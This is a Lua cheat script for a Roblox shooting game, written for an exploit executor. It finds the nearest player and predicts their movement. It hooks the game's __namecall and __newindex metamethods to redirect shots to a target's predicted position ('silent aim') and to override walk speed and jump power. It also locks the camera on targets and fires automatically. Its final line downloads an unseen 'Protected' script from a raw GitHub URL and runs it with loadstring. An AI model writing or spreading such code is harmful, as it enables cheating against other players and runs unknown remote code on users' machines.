if not getgenv().settings then
   return 
end

getgenv().services = {
    get_service = function(self, service_name)
        return cloneref(game:GetService(service_name))
    end
}
-- // services \\ --
local players = getgenv().services:get_service("Players")
local run_service = getgenv().services:get_service("RunService")
local workspace = getgenv().services:get_service("Workspace")
local user_input_service = getgenv().services:get_service("UserInputService")
local tween_service = game:GetService("TweenService")
local stats = game:GetService("Stats")
local camera = workspace.CurrentCamera
-- // vars \\ --
getgenv().target = nil
getgenv().silent_aiming_position = nil
local local_player = players.LocalPlayer
local local_character = local_player.Character
local local_root = local_character and local_character:FindFirstChild("HumanoidRootPart")

local fov = Drawing.new("Circle")
fov.Visible = getgenv().settings.visuals.fov.visible
fov.Transparency = getgenv().settings.visuals.fov.transparency
fov.Color = getgenv().settings.visuals.fov.color
fov.Filled = getgenv().settings.visuals.fov.filled
fov.Radius = getgenv().settings.visuals.fov.size
fov.NumSides = getgenv().settings.visuals.fov.size * 100
fov.Position = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)

local screen_gui = Instance.new("ScreenGui")
screen_gui.Name = "locking"
screen_gui.ResetOnSpawn = false
screen_gui.DisplayOrder = 0
screen_gui.IgnoreGuiInset = false
screen_gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
screen_gui.Enabled = true
screen_gui.AutoLocalize = true
screen_gui.Parent = gethui()

local text_button = Instance.new("TextButton")
text_button.Name = "enabler"
text_button.Text = "Locking: None"
text_button.Font = Enum.Font.Code
text_button.TextSize = 20
text_button.TextColor3 = Color3.fromRGB(200, 200, 200)
text_button.TextStrokeColor3 = Color3.fromRGB(20, 20, 20)
text_button.TextStrokeTransparency = 0
text_button.RichText = true
text_button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
text_button.BorderColor3 = Color3.fromRGB(0, 0, 0)
text_button.Size = UDim2.new(0, 200, 0, 50)
text_button.Position = UDim2.new(0.5, 0, 0.15, 0)
text_button.AnchorPoint = Vector2.new(0.5, 0.5)
text_button.AutoButtonColor = true
text_button.Draggable = true
text_button.SizeConstraint = Enum.SizeConstraint.RelativeXY
text_button.Visible = true
text_button.ZIndex = 1
text_button.Parent = screen_gui

local ui_corner = Instance.new("UICorner", text_button)
ui_corner.CornerRadius = UDim.new(0.2, 0)

local ui_stroke = Instance.new("UIStroke", text_button)
ui_stroke.Thickness = 2.5
ui_stroke.Color = Color3.fromRGB(80, 80, 80)
ui_stroke.Transparency = 0
ui_stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

local highlight = Instance.new("Highlight")

getgenv().funcs = {}

function getgenv().funcs.knocked_check(character)
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then return false end
    return humanoid.Health < 10
end

function getgenv().funcs.force_field_check(character)
    return character and character:FindFirstChildOfClass("ForceField") ~= nil
end

function getgenv().funcs.get_closest_player(radius)
    if not local_root then return end
    local closest, distance = nil, math.huge
    local screen_center = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
    for index, player in pairs(players:GetPlayers()) do
        if player ~= local_player and player.Character then
            local character = player.Character
            if getgenv().settings.checks.knocked and getgenv().funcs.knocked_check(character) then continue end
            if getgenv().settings.checks.forcefield and getgenv().funcs.force_field_check(character) then continue end
            local root = character:FindFirstChild("HumanoidRootPart")
            if root then
                local vector, on_screen = camera:WorldToViewportPoint(root.Position)
                if on_screen then
                    local magnitude = (Vector2.new(vector.X, vector.Y) - screen_center).Magnitude
                    if magnitude < distance and magnitude <= radius then
                        closest, distance = player, magnitude
                    end
                end
            end
        end
    end
    return closest
end

function getgenv().funcs.recalculate_velocity(player, part_name)
    local character = player and player.Character
    if not character then return Vector3.zero end
    local part = character:FindFirstChild(part_name)
    if not part then return Vector3.zero end

    local start_pos = part.Position
    local start_tick = tick()

    task.wait(0.003)

    if not part then return Vector3.zero end
    local new_pos = part.Position
    local new_tick = tick()
    local delta_tick = new_tick - start_tick

    return (new_pos - start_pos) / delta_tick
end

local_player.CharacterAdded:Connect(function(character)
    local_character = character
    local_root = character:WaitForChild("HumanoidRootPart")
end)

function getgenv().funcs.is_target_in_air(player)
    local character = player and player.Character
    if not character then return false end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    local root_part = character:FindFirstChild("HumanoidRootPart")
    if not humanoid or not root_part then return false end
    local velocity = getgenv().funcs.recalculate_velocity(player, "HumanoidRootPart")
    return velocity.Y >= 2 and humanoid.FloorMaterial == Enum.Material.Air
end

function getgenv().funcs.get_aiming_position(player, hit_part, pred)
    if not player or not player.Character then return Vector3.zero end
    local part = player.Character:FindFirstChild(hit_part)
    if not part then return Vector3.zero end

    local velocity = getgenv().funcs.recalculate_velocity(player, hit_part)
    local prediction = Vector3.new(pred, pred, pred)
    local aim_position = part.Position + velocity * prediction

    if getgenv().funcs.is_target_in_air(player) then
        aim_position = aim_position + Vector3.new(0, getgenv().settings.combat.offsets.jump, 0)
    end

    return aim_position or Vector3.zero
end

text_button.MouseButton1Click:Connect(function()
    if getgenv().settings.combat.silent.mode == "Target" then
        if getgenv().target then
            getgenv().target = nil
            text_button.Text = "Locking: None"
        else
            getgenv().target = getgenv().funcs.get_closest_player(getgenv().settings.visuals.fov.size)
            text_button.Text = getgenv().target and "Locking: " .. getgenv().target.DisplayName or "Locking: None"
        end
    else
        getgenv().target = nil
        text_button.Text = "Locking: Auto"
    end
end)

run_service.RenderStepped:Connect(function()
    if getgenv().settings.combat.silent.auto_prediction or getgenv().settings.combat.camlock.auto_prediction then
        local ping_stats = stats.Network.ServerStatsItem["Data Ping"]:GetValue()
        local auto_pred_value
        if ping_stats then
            auto_pred_value = 0.1 + ping_stats / 2000 + (ping_stats / 1000) * (ping_stats / 1500) * 1.025
        end
        if getgenv().settings.combat.silent.auto_prediction then
            getgenv().settings.combat.silent.prediction = auto_pred_value
        end
        if getgenv().settings.combat.camlock.auto_prediction then
            getgenv().settings.combat.camlock.prediction = auto_pred_value
        end
    end

    if getgenv().settings.combat.silent.enabled then
        if getgenv().settings.combat.silent.mode == "Silent" then
            getgenv().target = getgenv().funcs.get_closest_player(getgenv().settings.visuals.fov.size)
        end
        
        if getgenv().settings.visuals.highlight.enabled and getgenv().target and getgenv().target.Character then
            highlight.Parent = getgenv().target.Character
            highlight.FillColor = getgenv().settings.visuals.highlight.fill_color
            highlight.OutlineColor = getgenv().settings.visuals.highlight.outline_color
        else 
            highlight.Parent = nil
        end

        if getgenv().target then
            getgenv().silent_aiming_position = getgenv().funcs.get_aiming_position(getgenv().target, getgenv().settings.combat.silent.hit_part, getgenv().settings.combat.silent.prediction)
        else
            getgenv().silent_aiming_position = Vector3.zero
        end
    else
        getgenv().silent_aiming_position = Vector3.zero
    end

    if getgenv().settings.combat.camlock.enabled and getgenv().target and getgenv().target.Character then
        local aiming_position = getgenv().funcs.get_aiming_position(getgenv().target, getgenv().settings.combat.camlock.hit_part, getgenv().settings.combat.camlock.prediction)
        local target_cframe = CFrame.new(camera.CFrame.Position, aiming_position)
        camera.CFrame = camera.CFrame:Lerp(target_cframe, getgenv().settings.combat.camlock.smoothness)
    end

    if getgenv().settings.combat.auto_air.enabled and getgenv().target and getgenv().target.Character then
        if getgenv().funcs.is_target_in_air(getgenv().target) then
            local tool = local_character and local_character:FindFirstChildOfClass("Tool")
            if tool then
                tool:Activate()
            end
            task.wait(getgenv().settings.combat.auto_air.delay)
        end
    end
end)

local old_namecall
old_namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local arguments = {...}
    local call_method = tostring(getnamecallmethod())

    if not checkcaller() and call_method == "FireServer" then
        for index, arg in pairs(arguments) do
            if typeof(arg) == "Vector3" then
                if getgenv().settings.combat.silent.enabled and getgenv().target and getgenv().silent_aiming_position then
                    arguments[index] = getgenv().silent_aiming_position
                end
                return old_namecall(self, unpack(arguments))
            elseif typeof(arg) == "table" then
                for sub_index, value in pairs(arg) do
                    if typeof(value) == "Vector3" then
                        if getgenv().settings.combat.silent.enabled and getgenv().target and getgenv().silent_aiming_position then
                            arg[sub_index] = getgenv().silent_aiming_position
                        end
                        return old_namecall(self, unpack(arguments))
                    end
                end
            end
        end
    end

    return old_namecall(self, ...)
end))

local old_new_index
old_new_index = hookmetamethod(game, "__newindex", newcclosure(function(self, index, value)
    if not checkcaller() and self:IsA("Humanoid") then
        if index == "WalkSpeed" and getgenv().settings.misc.player.walk_speed.enabled then
            return old_new_index(self, index, getgenv().settings.misc.player.walk_speed.value)
        elseif index == "JumpPower" and getgenv().settings.misc.player.jump.enabled then
            return old_new_index(self, index, getgenv().settings.misc.player.jump.value)
        end
    end
    return old_new_index(self, index, value)
end))

task.wait(0.1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/aa8283/i/refs/heads/main/Protected_2547730226887233.txt"))() 

